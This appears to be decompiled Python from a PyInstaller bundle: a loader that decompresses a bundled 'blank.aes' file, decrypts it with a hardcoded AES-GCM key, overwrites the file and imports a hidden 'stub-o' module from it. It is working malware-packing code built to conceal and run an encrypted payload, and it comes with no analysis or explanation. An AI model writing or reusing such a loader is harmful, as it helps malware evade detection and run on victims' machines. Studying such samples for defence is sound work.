# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: loader-o.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import sys
import base64
import zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter
zipfile = os.path.join(sys._MEIPASS, 'blank.aes')
module = 'stub-o'
key = base64.b64decode('2q/sLUiKaAByqjNs7+hR1X5IRfyQjKWOg2LlbRMPJPE=')
iv = base64.b64decode('/1TYbqPcBumXy94U')

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)
if os.path.isfile(zipfile):
    with open(zipfile, 'rb') as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, iv, ciphertext)
    with open(zipfile, 'wb') as f:
        f.write(decrypted)
    zipimporter(zipfile).load_module(module)